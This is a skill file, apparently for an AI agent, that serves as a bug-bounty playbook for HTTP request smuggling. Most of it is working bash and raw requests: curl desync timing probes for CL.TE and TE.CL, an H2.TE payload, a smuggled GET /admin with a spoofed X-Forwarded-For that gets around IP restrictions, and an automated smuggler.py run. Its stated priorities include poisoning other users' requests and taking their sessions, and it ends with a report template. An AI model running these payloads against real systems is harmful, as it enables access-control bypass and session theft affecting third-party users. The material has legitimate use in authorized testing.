---
name: k1nzr3c0n-hunt-http-smuggling
description: "HTTP Request Smuggling hunting skill. Covers CL.TE, TE.CL, H2.CL, H2.TE variants. 2026 status: Nginx≥1.21/Caddy/Envoy hardened, HAProxy≤2.4/F5/Citrix still vulnerable. Smuggling via HTTP/2 downgrade, response queue poisoning, request queue poisoning."
tags: [http-smuggling, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — HTTP Request Smuggling

> **2026 status**: Most modern proxies patched. Target: HAProxy≤2.4, F5 BIG-IP, Citrix, old Nginx.
> **Proof**: smuggled request must affect another user — timing attack confirms desync, not just your own response.

---

## Crown Jewels

```
Priority 1 — Request queue poisoning: inject malicious prefix into another user's request
Priority 2 — Response queue poisoning: serve wrong response to another user (session theft)
Priority 3 — Bypass front-end security controls (WAF, auth headers, IP restrictions)
Priority 4 — H2.TE via HTTP/2 downgrade (most modern vulnerable path)
Priority 5 — SSRF via smuggled requests to internal services
```

---

## Phase 0 — Detect Vulnerable Infrastructure

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_smuggling_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

echo "=== HTTP Smuggling Infrastructure Detection ==="

# Identify proxy chain
curl -skI "https://${TARGET}/" | grep -iE 'via:|x-forwarded|server:|x-powered|x-served-by' | sed 's/^/  /'

echo ""
echo "=== 2026 Vulnerability Matrix ==="
PROXY_HEADER=$(curl -skI "https://${TARGET}/" | grep -i 'via:')
echo "  Via: $PROXY_HEADER"
echo ""
echo "  Likely VULNERABLE:  HAProxy <= 2.4 | F5 BIG-IP | Citrix ADC | old Nginx (<1.21)"
echo "  Likely PATCHED:     Nginx >= 1.21 | Caddy | Envoy | AWS ALB (2023+)"
echo "  TEST ALWAYS:        H2 downgrade path (most apps still vulnerable via HTTP/2)"
```

## Phase 1 — CL.TE Detection

```bash
echo "=== CL.TE Detection (Content-Length vs Transfer-Encoding) ==="
BASE="https://${TARGET}"

# CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
# If backend honors TE: chunked, it reads only 4 bytes of body (0\r\n\r\n = empty chunk)
# Then the "SMUGGLED" part is prepended to next request

echo "CL.TE timing test (should take ~10s if vulnerable):"
START=$(date +%s%3N)
curl -sk "${BASE}/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 6" \
  --data $'3\r\nabc\r\nX\r\n\r\n' \
  -m 15 -o /dev/null
END=$(date +%s%3N)
ELAPSED=$(( (END - START) / 1000 ))
echo "  Elapsed: ${ELAPSED}s (>5s may indicate CL.TE desync)"

# TE.CL: reverse — front uses TE, back uses CL
echo ""
echo "TE.CL timing test:"
START2=$(date +%s%3N)
curl -sk "${BASE}/" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 4" \
  --data $'0\r\n\r\nA' \
  -m 15 -o /dev/null
END2=$(date +%s%3N)
ELAPSED2=$(( (END2 - START2) / 1000 ))
echo "  Elapsed: ${ELAPSED2}s"
```

## Phase 2 — H2.TE (HTTP/2 Downgrade)

```bash
echo "=== H2.TE via HTTP/2 Downgrade ==="
echo "Most servers still vulnerable via HTTP/2 even if HTTP/1.1 patched"
echo ""
echo "Requires: HTTP/2 capable proxy that downgrades to HTTP/1.1 for backend"
echo "Tool: use Burp Suite → Repeater → change protocol to HTTP/2"
echo ""
echo "H2.TE payload (in Burp HTTP/2 request):"
cat << 'PAYLOAD'
POST / HTTP/2
Host: TARGET
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

0

SMUGGLED
PAYLOAD

echo ""
echo "If Burp shows warning about TE in HTTP/2 but sends anyway → test for desync"
echo "Note: in HTTP/2, Transfer-Encoding is prohibited by spec, so proxy may strip it"
echo "      but if it passes it through in the HTTP/1.1 backend request → H2.TE"
```

## Phase 3 — Security Control Bypass via Smuggling

```bash
echo "=== Security Bypass via Smuggled Request ==="
echo "Bypass front-end WAF or IP restriction by smuggling to backend directly"
echo ""
echo "Example: bypass IP restriction on /admin"
echo ""
cat << 'SMUGGLE'
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: TARGET
X-Forwarded-For: 127.0.0.1
Content-Length: 10

x=
SMUGGLE
echo ""
echo "If next normal request gets /admin response → bypass confirmed"
```

## Phase 4 — Confirm with Burp Smuggler Extension

```bash
echo "=== Automated Detection ==="
echo "Burp Extension: HTTP Request Smuggler (James Kettle)"
echo "  1. Install from BApp Store"
echo "  2. Right-click any request → Extensions → HTTP Request Smuggler → Smuggle probe"
echo "  3. Checks: CL.TE, TE.CL, TE.TE, H2.CL, H2.TE automatically"
echo ""
echo "smuggler.py (open source):"
echo "  git clone https://github.com/defparam/smuggler"
echo "  python3 smuggler.py -u https://${TARGET}/"
python3 - << 'PYEOF' 2>/dev/null || echo "  (smuggler.py not found — use Burp extension)"
import subprocess
result = subprocess.run(['python3', 'smuggler/smuggler.py', '-u', f'https://${TARGET}/'], 
                      capture_output=True, text=True, timeout=30)
print(result.stdout[:500])
PYEOF
```

## Gate 0

```bash
echo "=== HTTP Smuggling Gate 0 ==="
echo "  □ Timing: consistent 10s delay on CL.TE/TE.CL probe (n≥5 trials)"
echo "  □ Echo: smuggled prefix appears in another request's response"
echo "  □ Security bypass: /admin accessible via smuggled request"
echo "  □ Another user affected: not just your own session"
echo "  □ Proxy version confirmed as vulnerable (not patched version)"
echo "  □ Reproducible: at least 3/5 attempts show smuggling effect"
echo ""
echo "  HARD RULE: statistical rule required — 1 timing anomaly = jitter"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
HTTP Request Smuggling (CL.TE) on [target.com]: backend receives smuggled prefix allowing injection into other users' requests — confirmed via response queue poisoning showing victim's session cookie
H2.TE desync via HTTP/2 downgrade bypasses WAF restriction on [/admin], returning admin dashboard to regular users
```
